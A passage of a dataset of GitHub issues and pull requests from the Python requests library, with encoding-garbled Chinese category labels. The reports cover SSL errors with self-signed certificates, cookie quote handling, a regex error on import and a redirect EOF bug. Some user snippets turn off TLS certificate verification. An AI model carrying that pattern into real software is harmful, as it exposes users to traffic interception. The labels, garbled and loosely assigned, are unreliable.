            ssl_params[""ssl_context""] = self.ssl_context

        return host_params, ssl_params

if __name__ == ""__main__"":
    # Create a custom SSL context
    ssl_context = ssl._create_unverified_context()
    ssl_context.set_ciphers(""DEFAULT@SECLEVEL=2"")  # Adjusting the security level to support 2048 bit keys

    # Example API call setup
    username = ""<admin>""
    password = ""<password>""
    protocol = ""https""
    api_url = f""{protocol}://<host>/""
    action = ""<action>""
    headers = {""Content-Type"": ""application/json""}

    # Create a session with the SSLAdapter
    session = requests.Session()
    session.auth = (username, password)
    session.mount(f""{protocol}://"", SSLAdapter(ssl_context=ssl_context))

    try:
        response = session.get(api_url + action, timeout=15, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print(""Response:"", response.json())
    except requests.exceptions.RequestException as e:
        print(f""An error occurred: {e}"")

```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.0""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.13.0""
  },
  ""platform"": {
    ""release"": ""24.3.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400000""
  },
  ""urllib3"": {
    ""version"": ""2.2.3""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6893
2848110391,Issue with SSL verification using self-signed certificate in version 2.32.3,"I am experiencing an issue with version 2.32.3 of the library when using build_connection_pool_key_attributes with a self-signed certificate. I need a custom SSL context because the connection fails due to weak certificate strength.

See also https://github.com/psf/requests/issues/6715 

Here is the code I am using:


```python
Code kopieren
import ssl
import requests
from requests.adapters import HTTPAdapter

class SSLAdapter(HTTPAdapter):
    """"""An HTTPAdapter that uses an arbitrary SSL context.""""""

    def __init__(self, ssl_context: ssl.SSLContext = None, **kwargs):
        """"""Initialize the SSLAdapter.""""""
        super().__init__(**kwargs)
        self.ssl_context = ssl_context

    def build_connection_pool_key_attributes(
        self,
        request: requests.PreparedRequest,
        verify: bool | str,
        cert: str | tuple[str, str] | None = None,
    ) -> tuple[dict, dict]:
        host_params, ssl_params = super().build_connection_pool_key_attributes(
            request, verify, cert
        )
        if verify is True and self.ssl_context:
            ssl_params[""ssl_context""] = self.ssl_context

        return host_params, ssl_params

if __name__ == ""__main__"":
    # Create a custom SSL context
    ssl_context = ssl._create_unverified_context()
    ssl_context.set_ciphers(""DEFAULT@SECLEVEL=2"")  # Adjusting the security level to support 2048 bit keys

    # Example API call setup
    username = ""<admin>""
    password = ""<password>""
    protocol = ""https""
    api_url = f""{protocol}://<host>/""
    action = ""<action>""
    headers = {""Content-Type"": ""application/json""}

    # Create a session with the SSLAdapter
    session = requests.Session()
    session.auth = (username, password)
    session.mount(f""{protocol}://"", SSLAdapter(ssl_context=ssl_context))

    try:
        response = session.get(api_url + action, timeout=15, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print(""Response:"", response.json())
    except requests.exceptions.RequestException as e:
        print(f""An error occurred: {e}"")

```

When I run this code, I encounter the following error:

`An error occurred: HTTPSConnectionPool(host='<host>', port=443): Max retries exceeded with url: /<action>/ (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1000)')))`

I expected that using _create_unverified_context would allow for self-signed certificates, but it seems that is not the case. What am I doing wrong?

Any guidance on how to resolve this issue would be greatly appreciated!","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6892
2846046708,Remove incorrect handling of escaped quotes in cookie values,"fixed #6890, #3759",Bugåé¦ˆ,ä¸­,https://github.com/psf/requests/pull/6891
2846042981,Incorrect Handling of Escaped Quotes in Cookie Values,"## Expected Result

Legitimate escaped quotes (e.g., `\""`) in cookie values should be preserved. For example:  
Input value `""159\\""687""` (actual string: `159\""687`) should remain unchanged.

## Actual Result

Requests incorrectly replaces escaped quotes with an empty string, causing `""159\\""687""` to become `""159687""` (string becomes `159687`), which corrupts valid values.

## Reproduction Steps

```python
import requests
from requests.cookies import create_cookie

# Create a cookie with escaped quotes
cookie = create_cookie(
    name=""test_cookie"",
    value='""159\\""687""',  # Actual stored value should be 159\""687
    domain=""example.com""
)

# Test using a session
with requests.Session() as s:
    s.cookies.set_cookie(cookie)
    retrieved = s.cookies.get(""test_cookie"")
    print(f""Expected: 159\\\""687 | Actual: {retrieved.value}"")  # Actual output: 159687
```

## Issue Analysis

The code at [src/requests/cookies.py#L349-L356](https://github.com/psf/requests/blob/f761e74a4d50d2e88d9e30e660494b36c9d630f8/src/requests/cookies.py#L349-L356) has the following problem:

```python
# Problematic code snippet
if (
    hasattr(cookie.value, ""startswith"")
    and cookie.value.startswith('""')
    and cookie.value.endswith('""')
):
    cookie.value = cookie.value.replace('\\""', """")  # Incorrectly removes all escaped quotes
```

This logic makes incorrect assumptions about cookie value sanitization. While RFC 6265 specifies that cookie values shouldn't _contain_ escaped characters (through its `cookie-value` definition), many real-world implementations:
1. Allow backslash-escaped quotes in cookie values for historical compatibility
2. Expect clients to preserve such values verbatim for proper server-side parsing
3. Use these patterns in legitimate scenarios (e.g., JSON fragments in cookies)

By forcibly stripping escaped quotes, Requests breaks values that:
- Were explicitly escaped by servers
- Contain valid escaped sequences from non-standard implementations
- Include quote characters in structured data formats

## Suggested Fix
Remove this non-standard cleanup logic entirely.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6890
2840920833,Updated the test for extract_zipped_paths to run correctly if test_utils.py is changed,"Hey! So I was playing around with requests and pytest and trying to see how unit tests work. While messing around with the tests cases in `test_utils.py`, I ran into a weird error, a completely unrelated unit test began to fail!

This test turned out to be the test for the the function `extract_zipped_paths` in `utils.py`. It seems that this function tries to extract a zipped file to a specific location, but doesn't do so if a file already exists at that location.

In the unit test for this function, the test file itself is being used to validate whether the file is properly extracted post zipping. However, after running the test suite once, the zipped file is never replaced again! This led to newer versions of this file being compared with an older version, which ultimately caused the test case to fail in the `filecmp` assertion.

Instead of me having to `rm -rf` it every time, I decided to include a minor cleanup step in the test case itself. Hope this helps out any future devs!

**Note:** I'm open to other suggestions as well. I tried to keep the underlying code/functionality as unchanged as possible, another approach could be to make a separate file just to test out this function? Could be a randomly generated file during tests, or a fixed one in the main repo as well.","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®",ä¸­,https://github.com/psf/requests/pull/6889
2839197310,"Importing requests will very rarely, throw a regex error.","<!-- Summary. -->

`import requests`
requests==2.32.3
throws an intermittent regular expression error for IPV6 in `<my_venv>/lib/python3.10/site-packages/urllib3/util/url.py`
The error is extremely rare and intermittently shows up, with seemingly nothing different.

It's likely worth mentioning that I'm using Ubuntu LTS and have disabled IPV6 support via `grub`
So my OS will never do anything using IPV6

How I disabled IPV6 via grub:
I edited my `/etc/default/grub`
with the following changes:
```
GRUB_CMDLINE_LINUX_DEFAULT=""ipv6.disable=1""
```

<!-- What you expected. -->
I would expect that  `import requests` never throws a regex related error.

## Actual Result
```
Traceback (most recent call last):
  ... # REDACTED
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/MY_PROJECT/MY_SCRIPT.py"", line 3, in <module>
   import requests
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/requests/__init__.py"", line 43, in <module>
   import urllib3
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/__init__.py"", line 15, in <module>
   from ._base_connection import _TYPE_BODY
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/_base_connection.py"", line 5, in <module>
   from .util.connection import _TYPE_SOCKET_OPTIONS
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/util/__init__.py"", line 8, in <module>
   from .ssl_ import (
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/util/ssl_.py"", line 13, in <module>
   from .url import _BRACELESS_IPV6_ADDRZ_RE, _IPV4_RE
  File ""/home/MYUSER/.pyenv/versions/MY_VENV/lib/python3.10/site-packages/urllib3/util/url.py"", line 60, in <module>
   _IPV6_ADDRZ_RE = re.compile(""^"" + _IPV6_ADDRZ_PAT + ""$"")
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/re.py"", line 251, in compile
   return _compile(pattern, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/re.py"", line 303, in _compile
   p = sre_compile.compile(pattern, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 792, in compile
   code = _code(p, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 631, in _code
   _compile(code, p.data, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 225, in _compile
   _compile(code, av, flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 172, in _compile
   _compile(code, av[2], flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 172, in _compile
   _compile(code, av[2], flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 164, in _compile
   _compile(code, av[2], flags)
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_compile.py"", line 106, in _compile
   for op, av in pattern:
  File ""/home/MYUSER/.pyenv/versions/3.10.13/lib/python3.10/sre_parse.py"", line 166, in __getitem__
   if isinstance(index, slice):
TypeError: slice expected at least 1 argument, got 0
```

<!-- What happened instead. -->

## Reproduction Steps

```python
import requests # That's it.
```

## System Information

    $ python -m requests.help

```json
(?:(?:[0-9A-Fa-f]{1,4}:){6}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|::(?:[0-9A-Fa-f]{1,4}:){5}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:){4}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:)?[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:){3}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,2}[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:){2}(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,3}[0-9A-Fa-f]{1,4})?::[0-9A-Fa-f]{1,4}:(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,4}[0-9A-Fa-f]{1,4})?::(?:[0-9A-Fa-f]{1,4}:[0-9A-Fa-f]{1,4}|(?:[0-9]{1,3}\.){3}[0-9]{1,3})|(?:(?:[0-9A-Fa-f]{1,4}:){0,5}[0-9A-Fa-f]{1,4})?::[0-9A-Fa-f]{1,4}|(?:(?:[0-9A-Fa-f]{1,4}:){0,6}[0-9A-Fa-f]{1,4})?::)
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.13""
  },
  ""platform"": {
    ""release"": ""6.8.0-52-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""300000d0""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥, æ€§èƒ½é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6888
2832866427,Automatically retry idempotent requests,"[`urllib3`](https://urllib3.readthedocs.io/en/stable/user-guide.html#retrying-requests), `OkHttp` (Java) and Apache HttpClient HTTP client libraries retry failed idempotent requests by default. I think retrying such requests is something that user would naturally want. Would a pull request adding such a functionality be accepted?","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6887
2831396617,requests.Session is not properly applying SSL Verification default,"The [requests documentation](https://requests.readthedocs.io/en/latest/api/#requests.Session.verify) states that the `value` property of `request.Session` is ""SSL verification default"". I believe that this default, when set in code, should have a higher precedence than the value set through the `REQUESTS_CA_BUNDLE` environment variable.

## Expected Result

`Session.requests` should use any non-None value of **verify** and ignore the value of `REQUESTS_CA_BUNDLE` (default set in code should have higher precedence than the environment). `REQUESTS_CA_BUNDLE` should only be used if `Session.verify=None` in code.

## Actual Result

`Session.requests` overrides **verify=False** with the value of `REQUESTS_CA_BUNDLE`

## Reproduction Steps

```python
export REQUESTS_CA_BUNDLE=/opt/homebrew/etc/ca-certificates/cert.pem

python3

import requests
session = Session()
session.verify = False
session.get('https://127.0.0.1') # Website with a self signed certificate

requests.exceptions.SSLError: HTTPSConnectionPool(host='127.0.0.1', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate (_ssl.c:1147)')))
```

## System Information

    $ python -m requests.help

```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.9.21""
  },
  ""platform"": {
    ""release"": ""23.6.0"",
    ""system"": ""Darwin""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30400000""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}

```","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, ç½‘ç»œè¿æ¥å¤±è´¥, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/issues/6886
2830975306,Unexpected `SSLEOFError` when Receiving Redirect (307) Response with Large Data Payload,"<!-- Summary. -->

This issue occurs only when TLS is enabled on both the client and server sides.

When a `requests` client sends a large `PUT` request and receives an **HTTP 307 redirect**, the server may close the connection early before the payload is fully transmitted. This happens because the server issuing the redirect does not need to process the request body, so it terminates the connection as soon as it sends the redirect response. However, `requests` does not handle this scenario gracefully and raises the following SSL error:
```
urllib3.exceptions.SSLError: EOF occurred in violation of protocol (_ssl.c:2426)
```
## Expected Result

If an HTTP 307 redirect is received before the payload is fully transmitted, `requests` should handle the redirect properly **without complaining on the previous early-closed connection**. The client should not fail simply because the server closed the connection early.

## Actual Result

`requests` fails with `SSLEOFError` instead of retrying the request to the redirected location.
This issue does not occur with small payloads (maybe because they are typically sent in a single transmission chunk and completes before the server closes it?)

## Reproduction Steps

### Client-Side Code
```python
import requests
requests.put(""https://localhost:5000/"", data=""A"" * 10_000_000, verify=""/path/to/openssl/certs/ca.crt"")
...
>> urllib3.exceptions.SSLError: EOF occurred in violation of protocol (_ssl.c:2426)
```

### Server-Side Code (Minimal Proxy)
```python
import http.server
import socketserver
import ssl
import urllib.parse

CERT_FILE = ""/path/to/openssl/certs/server.crt""
KEY_FILE = ""/path/to/openssl/certs/server.key""
REDIRECT_BASE_URL = ""https://google.com""

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_PUT(self):
        # Uncomment below to drain the request payload and prevent this issue
        # content_length = int(self.headers.get(""Content-Length"", 0))
        # if content_length:
        #     self.rfile.read(content_length)  # Uncomment to prevent connection reset

        target_url = urllib.parse.urljoin(REDIRECT_BASE_URL, self.path)

        self.send_response(307)
        self.send_header(""Location"", target_url)
        self.send_header(""Content-Length"", ""0"")
        self.end_headers()

if __name__ == ""__main__"":
    PORT = 5000
    with socketserver.TCPServer(("""", PORT), ProxyHandler) as httpd:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        httpd.serve_forever()
```

### SSL Certificate Generation
If needed, generate self-signed TLS certificates using the following OpenSSL commands:
```sh
openssl req -x509 -newkey rsa:2048 -keyout ca.key -out ca.crt -days 1024 -nodes -subj ""/CN=localhost"" \
  -extensions v3_ca -config <(printf ""[req]\ndistinguished_name=req\nx509_extensions=v3_ca\n[ v3_ca ]\nsubjectAltName=DNS:localhost,DNS:127.0.0.1,IP:127.0.0.1\nbasicConstraints=CA:TRUE\n"")

openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr -subj ""/C=US/ST=California/L=Santa Clara/O=COMPANY/OU=TEAM/CN=localhost"" \
  -config <(printf ""[req]\ndistinguished_name=req\nreq_extensions = v3_req\n[ v3_req ]\nsubjectAltName=DNS:localhost,DNS:127.0.0.1,IP:127.0.0.1\n"")

openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365 -sha256 \
  -extfile <(printf ""[ext]\nsubjectAltName=DNS:localhost,DNS:127.0.0.1,IP:127.0.0.1\nbasicConstraints=CA:FALSE\nkeyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment\nextendedKeyUsage=serverAuth,clientAuth\n"") -extensions ext

```

## System Information
Python 3.10.12 (main, Jan 17 2025, 14:35:34) [GCC 11.4.0] on linux
$ python3 -m requests.help
```json
{
  ""chardet"": {
    ""version"": null
  },
  ""charset_normalizer"": {
    ""version"": ""3.4.1""
  },
  ""cryptography"": {
    ""version"": """"
  },
  ""idna"": {
    ""version"": ""3.10""
  },
  ""implementation"": {
    ""name"": ""CPython"",
    ""version"": ""3.10.12""
  },
  ""platform"": {
    ""release"": ""5.15.0-118-generic"",
    ""system"": ""Linux""
  },
  ""pyOpenSSL"": {
    ""openssl_version"": """",
    ""version"": null
  },
  ""requests"": {
    ""version"": ""2.32.3""
  },
  ""system_ssl"": {
    ""version"": ""30000020""
  },
  ""urllib3"": {
    ""version"": ""2.3.0""
  },
  ""using_charset_normalizer"": true,
  ""using_pyopenssl"": false
}
```

<!-- This command is only available on Requests v2.16.4 and greater. Otherwise,
please provide some basic information about your system (Python version,
operating system, &c). -->
","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜, ç½‘ç»œè¿æ¥å¤±è´¥",ä¸­,https://github.com/psf/requests/issues/6885
2828277401,Include invalid type name in error message,* Included invalid type name in error message for better debugging.,Bugåé¦ˆ,ä¸­,https://github.com/psf/requests/pull/6884
2827984054,Bump actions/setup-python from 5.3.0 to 5.4.0,"Bumps [actions/setup-python](https://github.com/actions/setup-python) from 5.3.0 to 5.4.0.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/actions/setup-python/releases"">actions/setup-python's releases</a>.</em></p>
<blockquote>
<h2>v5.4.0</h2>
<h2>What's Changed</h2>
<h3>Enhancements:</h3>
<ul>
<li>Update cache error message by <a href=""https://github.com/aparnajyothi-y""><code>@â€‹aparnajyothi-y</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/968"">actions/setup-python#968</a></li>
<li>Enhance Workflows: Add Ubuntu-24, Remove Python 3.8  by <a href=""https://github.com/priya-kinthali""><code>@â€‹priya-kinthali</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/985"">actions/setup-python#985</a></li>
<li>Configure Dependabot settings by <a href=""https://github.com/HarithaVattikuti""><code>@â€‹HarithaVattikuti</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1008"">actions/setup-python#1008</a></li>
</ul>
<h3>Documentation changes:</h3>
<ul>
<li>Readme update - recommended permissions by <a href=""https://github.com/benwells""><code>@â€‹benwells</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1009"">actions/setup-python#1009</a></li>
<li>Improve Advanced Usage examples by <a href=""https://github.com/lrq3000""><code>@â€‹lrq3000</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/645"">actions/setup-python#645</a></li>
</ul>
<h3>Dependency updates:</h3>
<ul>
<li>Upgrade <code>undici</code> from 5.28.4 to 5.28.5 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1012"">actions/setup-python#1012</a></li>
<li>Upgrade <code>urllib3</code> from 1.25.9 to 1.26.19 in /<strong>tests</strong>/data by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/895"">actions/setup-python#895</a></li>
<li>Upgrade <code>actions/publish-immutable-action</code> from 0.0.3 to 0.0.4 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1014"">actions/setup-python#1014</a></li>
<li>Upgrade <code>@actions/http-client</code> from 2.2.1 to 2.2.3 by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1020"">actions/setup-python#1020</a></li>
<li>Upgrade <code>requests</code> from 2.24.0 to 2.32.2 in /<strong>tests</strong>/data by <a href=""https://github.com/dependabot""><code>@â€‹dependabot</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1019"">actions/setup-python#1019</a></li>
<li>Upgrade <code>@actions/cache</code> to <code>^4.0.0</code> by <a href=""https://github.com/priyagupta108""><code>@â€‹priyagupta108</code></a> in <a href=""https://redirect.github.com/actions/setup-python/pull/1007"">actions/setup-python#1007</a></li>
</ul>
<h2>New Contributors</h2>
<ul>
<li><a href=""https://github.com/benwells""><code>@â€‹benwells</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/1009"">actions/setup-python#1009</a></li>
<li><a href=""https://github.com/HarithaVattikuti""><code>@â€‹HarithaVattikuti</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/1008"">actions/setup-python#1008</a></li>
<li><a href=""https://github.com/lrq3000""><code>@â€‹lrq3000</code></a> made their first contribution in <a href=""https://redirect.github.com/actions/setup-python/pull/645"">actions/setup-python#645</a></li>
</ul>
<p><strong>Full Changelog</strong>: <a href=""https://github.com/actions/setup-python/compare/v5...v5.4.0"">https://github.com/actions/setup-python/compare/v5...v5.4.0</a></p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/actions/setup-python/commit/42375524e23c412d93fb67b49958b491fce71c38""><code>4237552</code></a> Improve Advanced Usage examples (<a href=""https://redirect.github.com/actions/setup-python/issues/645"">#645</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/709bfa58ba5a9cefd64220decb43e45cc2a85775""><code>709bfa5</code></a> Bump requests from 2.24.0 to 2.32.2 in /<strong>tests</strong>/data (<a href=""https://redirect.github.com/actions/setup-python/issues/1019"">#1019</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/ceb20b242df24c1f8bf064b3c943c31c2555ddd8""><code>ceb20b2</code></a> Bump <code>@â€‹actions/http-client</code> from 2.2.1 to 2.2.3 (<a href=""https://redirect.github.com/actions/setup-python/issues/1020"">#1020</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/0dc2d2cf0c96a1befa4c9f1803d3b9eb03458031""><code>0dc2d2c</code></a> Bump actions/publish-immutable-action from 0.0.3 to 0.0.4 (<a href=""https://redirect.github.com/actions/setup-python/issues/1014"">#1014</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/feb9c6e7c63362340a8853582968731d6adb0454""><code>feb9c6e</code></a> Bump urllib3 from 1.25.9 to 1.26.19 in /<strong>tests</strong>/data (<a href=""https://redirect.github.com/actions/setup-python/issues/895"">#895</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/d0b4fc497a1daddb64da40799d80949aa3a0c559""><code>d0b4fc4</code></a> Bump undici from 5.28.4 to 5.28.5 (<a href=""https://redirect.github.com/actions/setup-python/issues/1012"">#1012</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/e3dfaac0fd011839eef87186e3b48165c3ba0162""><code>e3dfaac</code></a> Configure Dependabot settings (<a href=""https://redirect.github.com/actions/setup-python/issues/1008"">#1008</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/b8cf3eb1ebc9c7f906e4ca96fcdf2e289e25d230""><code>b8cf3eb</code></a> Use the new cache service: upgrade <code>@actions/cache</code> to <code>^4.0.0</code> (<a href=""https://redirect.github.com/actions/setup-python/issues/1007"">#1007</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/1928ae624dc06094d8c65f021a4700ea8fa56b9d""><code>1928ae6</code></a> Update README.md (<a href=""https://redirect.github.com/actions/setup-python/issues/1009"">#1009</a>)</li>
<li><a href=""https://github.com/actions/setup-python/commit/3fddbee7870211eda9047db10474808be43c71ec""><code>3fddbee</code></a> Enhance Workflows: Add Ubuntu-24, Remove Python 3.8  (<a href=""https://redirect.github.com/actions/setup-python/issues/985"">#985</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/actions/setup-python/compare/0b93645e9fea7318ecaed2b359559ac225c90a2b...42375524e23c412d93fb67b49958b491fce71c38"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=actions/setup-python&package-manager=github_actions&previous-version=5.3.0&new-version=5.4.0)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot show <dependency name> ignore conditions` will show all of the ignore conditions of the specified dependency
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)


</details>","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6883
2825788921,Enhance raise_for_status() to include response content,"#  Improve raise_for_status() to Include Response Content

## Description:
Currently, the `raise_for_status()` method in `requests.models.Response` raises an `HTTPError` but does not include the response content in the exception message. This can make debugging difficult, especially when APIs return meaningful error messages in the response body.

## Proposed Change  
Modify `raise_for_status()` to append a snippet of the response content (if available) to the exception message. Example:  

## Why This Matters:

- Helps developers quickly understand API errors without manually inspecting the response body.

- Aligns with common practices in other HTTP client libraries.


## Example Use Case
_**Before :**_ 
requests.exceptions.HTTPError: 403 Client Error: Bad Request for url: https://api.example.com

_**After :**_
requests.exceptions.HTTPError: 403 Client Error: Bad Request for url: https://api.example.com
Response: {""error"": ""Invalid token""}


","Bugåé¦ˆ, åŠŸèƒ½å»ºè®®, æ–‡æ¡£é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6882
2825397093,refactor(URLRequired): Deprecate URLRequired exception with warning,"`requests.URLRequired` has been dead code since ab27027 (2012) and is never raised. This commit adds a `DeprecationWarning` to notify users that it will be removed in a future version. Invalid URLs instead raise `MissingSchema`, `InvalidSchema`, or `InvalidURL`.","åŠŸèƒ½å»ºè®®, è´¦å·é—®é¢˜",ä¸­,https://github.com/psf/requests/pull/6881
